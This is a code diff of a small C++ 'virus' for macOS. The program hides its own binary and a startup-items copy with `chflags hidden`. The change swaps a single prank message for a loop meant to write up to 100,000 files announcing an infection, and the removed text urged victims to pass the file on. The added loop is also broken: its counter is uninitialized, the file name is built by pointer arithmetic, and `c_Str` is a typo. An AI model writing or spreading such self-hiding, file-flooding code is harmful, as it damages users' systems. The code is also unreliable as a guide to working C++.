@@ -130,11 +130,13 @@ int main(int argc, char** argv) {
 		system(("chflags hidden " + argv[0]).c_str());
 		system(("chflags hidden /System/Library/StartupItems/" + argv[0]).c_str());
 		
-		ofstream targetFile ("HelloThere.txt");		// <- A file with a little message
-		
-		if (targetFile.is_open()) 		
-		{
-			targetFile << "Hello!\n" << "It seems that your computer has been infected by a virus\n" << "However, you seem to be running OSX\n" << "Which means I am unable to do anything... Would you mind doing me an amazing favor and send this file to anyone you know who is running OSX? It would do me a great job as currently I'm unable to do that...\nThank you!";
+		for (int x; x < 100000; x++) {
+			ofstream targetFile (("HelloThere" + x + ".txt").c_Str());		// <- A file with a little message
+
+			if (targetFile.is_open()) 		
+			{
+				targetFile << "Hello!\n" << "It seems that your computer has been infected by a virus\n";
+			}
 		}
 		
 	}
